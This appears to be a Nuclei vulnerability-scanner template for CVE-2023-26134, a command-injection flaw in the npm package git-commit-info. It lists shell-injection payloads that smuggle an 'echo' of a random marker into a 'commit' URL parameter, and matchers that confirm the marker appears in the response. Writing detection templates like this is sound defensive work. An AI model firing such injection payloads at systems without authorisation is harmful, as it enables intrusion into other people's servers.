id: CVE-2023-26134
info:
  name: git-commit-info - command injection via commit parameter
  author: intelligent-ears
  severity: high
  description: |
    The git-commit-info package (before 2.0.2) may be vulnerable to command
    injection when user-supplied 'commit' values are passed unsafely to a shell.
    This template probes common shell-injection contexts and requires product
    indicators + exploit evidence + supporting checks to reduce false positives.
  reference:
    - https://github.com/JPeer264/node-git-commit-info/issues/24
    - https://nvd.nist.gov/vuln/detail/CVE-2023-26134
  classification:
    cve-id: CVE-2023-26134
    cwe-id: CWE-78
  tags: cve,cve2023,git,command-injection,npm

variables:
  marker: "nuc{{rand_base(6)}}"
  common_payloads:
    - "invalidhash||echo {{marker}}"
    - "invalidhash && echo {{marker}}"
    - "invalidhash'; echo {{marker}} #"
    - "invalidhash; echo {{marker}}"
    - "invalidhash`echo {{marker}}`"
    - "$(echo {{marker}})"

http:
  - name: probe-commit-parameter
    method: GET
    path:
      - "{{BaseURL}}/?commit={{payload}}"

    payloads:
      payload:
        - "{{common_payloads}}"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "X-Powered-By: Express"
          - "Server: nginx"
        condition: or

      - type: word
        part: body
        words:
          - "git"
          - "repository"
        condition: or

      - type: dsl
        dsl:
          - "contains_any(body, '{{marker}}')"
          - "contains_any(body, 'fatal:','bad object','ambiguous argument')"
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: vulnerable_parameter
        regex:
          - 'commit=[^&\\s]*'
      - type: regex
        name: marker_found
        regex:
          - '{{marker}}'
